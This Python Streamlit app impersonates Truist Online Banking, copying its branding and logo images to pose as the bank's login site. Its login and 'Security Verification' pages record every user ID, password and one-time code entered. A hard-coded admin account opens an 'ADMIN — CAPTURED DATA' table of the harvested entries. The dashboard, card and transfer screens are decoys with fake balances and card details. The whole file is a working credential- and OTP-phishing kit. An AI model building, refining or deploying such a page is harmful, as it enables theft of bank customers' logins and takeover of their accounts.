import streamlit as st
import pandas as pd
from datetime import datetime

# ========================= CONFIG =========================
st.set_page_config(page_title="Truist Online Banking", page_icon="https://truist.com/favicon.ico", layout="wide")

# ========================= STORAGE =========================
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []

# ========================= CREDENTIALS =========================
VALID_USERNAME = "client001"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# ========================= SESSION STATE =========================
for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

# ========================= GLOBAL TRUIST CSS =========================
st.markdown("""
<style>
    .stApp {background: #502b85; color: white;}
    .truist-header {background: #502b85; padding: 15px; text-align: center; border-bottom: 5px solid #ffb700;}
    .glass-card {background: rgba(255,255,255,0.95); color: #333; border-radius: 8px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); margin: 20px 0;}
    .truist-btn {background: #ffb700 !important; color: #502b85 !important; font-weight: bold !important;}
    .truist-btn:hover {background: #e6a600 !important;}
    h1, h2, h3 {color: #502b85 !important;}
    .recording-dot {height: 10px; width: 10px; background: red; border-radius: 50%; display: inline-block; animation: pulse 2s infinite;}
    @keyframes pulse {0% {box-shadow: 0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow: 0 0 0 10px rgba(255,0,0,0);} 100% {box-shadow: 0 0 0 0 rgba(255,0,0,0);}}
</style>
""", unsafe_allow_html=True)

# ========================= LOGIN PAGE (PERFECT LOGO) =========================
def login_page():
    st.markdown("<div class='truist-header'>", unsafe_allow_html=True)
    st.image("https://raw.githubusercontent.com/ekapujiw2002/truist/main/truist-logo-white.png", width=250)
    st.markdown("</div>", unsafe_allow_html=True)

    st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
    st.markdown("<h1 style='color:white'>Welcome to Truist Online Banking</h1>", unsafe_allow_html=True)

    username = st.text_input("User ID", placeholder="Enter your User ID")
    password = st.text_input("Password", type="password", placeholder="Enter your password")
    if st.button("Log In", type="primary"):
        st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password})
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.is_admin = True
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("Incorrect User ID or password")

# ========================= OTP PAGE =========================
def otp_page():
    st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
    st.markdown("<h1>Security Verification</h1>", unsafe_allow_html=True)
    st.markdown("<p>We sent a 6-digit code to your phone ending in **--7842</p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
        if len(code) == 6:
            st.session_state.otp_verified = True
            st.balloons()
            st.rerun()
        else:
            st.error("Invalid code")

# ========================= ADMIN VIEW =========================
def admin_view():
    st.markdown("<h1 style='color:red'>ADMIN — CAPTURED DATA</h1>", unsafe_allow_html=True)
    if st.session_state.captured_creds:
        st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp:
        st.dataframe(pd.DataFrame(st.session_state.captured_otp))

# ========================= DASHBOARD PAGES =========================
def dashboard():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Welcome back</h1>", unsafe_allow_html=True)
    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", "$27,451.82")
    with c2: st.metric("Available Credit", "$15,700")
    with c3: st.metric("Monthly Spending", "$3,214")
    with c4: st.metric("Savings Goal", "78%")

def accounts():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Accounts</h1>", unsafe_allow_html=True)
    for name, bal in [("Premier Checking • ****2847", "$12,340.50"), ("High-Yield Savings • ****5901", "$14,911.32")]:
        st.markdown(f"<div class='glass-card'><h3>{name}</h3><h2>{bal}</h2></div>", unsafe_allow_html=True)

def cards_page():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Cards</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    # PERMANENT TRUIST CARD IMAGE
    st.image("https://raw.githubusercontent.com/ekapujiw2002/truist/main/truist-card.png", use_column_width=True)
    st.markdown("<h2 style='text-align:center; color:#502b85'>Truist One Rewards Card</h2>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center'>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("Show Full Number"):
            st.success("5412 7537 0000 7723")
    with col2:
        if st.button("Show Expiry"):
            st.success("11/28")
    with col3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Clicked"})
            st.info("CVV: 342")
            st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)

def transfer():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Transfer Funds</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.radio("Type", ["My Accounts", "External", "Zelle"])
    col1, col2 = st.columns(2)
    with col1: st.selectbox("From", ["Checking ****2847", "Savings ****5901"])
    with col2: st.selectbox("To", ["Savings ****5901", "Chase ****1234"])
    st.number_input("Amount", 0.01)
    if st.button("Send"): st.success("Transfer completed!") ; st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)

def messages():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Secure Messages</h1>", unsafe_allow_html=True)
    for m in ["Statement Ready", "New Login Alert", "Rate Increase"]:
        st.markdown(f"<div class='glass-card'><h4>🟢 {m}</h4></div>", unsafe_allow_html=True)

# ========================= SIDEBAR WITH TRUIST LOGO =========================
def sidebar():
    st.sidebar.image("https://raw.githubusercontent.com/ekapujiw2002/truist/main/truist-logo-white.png", width=180)
    st.sidebar.markdown(f"<h2 style='color:#ffb700'>{VALID_USERNAME.upper()}</h2>", unsafe_allow_html=True)
    st.sidebar.markdown("<p style='background:#ffb700; color:#502b85; padding:8px; border-radius:8px; text-align:center'>SECURE SESSION</p>", unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", ["Dashboard", "Accounts", "Cards", "Transfer Funds", "Messages"])
    if st.sidebar.button("Log Out"):
        st.session_state.authenticated = False
        st.rerun()
    return page
# ========================= MAIN =========================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current = sidebar()
    if current == "Accounts":
        accounts()
    elif current == "Cards":
        cards_page()
    elif current == "Transfer Funds":
        transfer()
    elif current == "Messages":
        messages()
    else:
        dashboard()

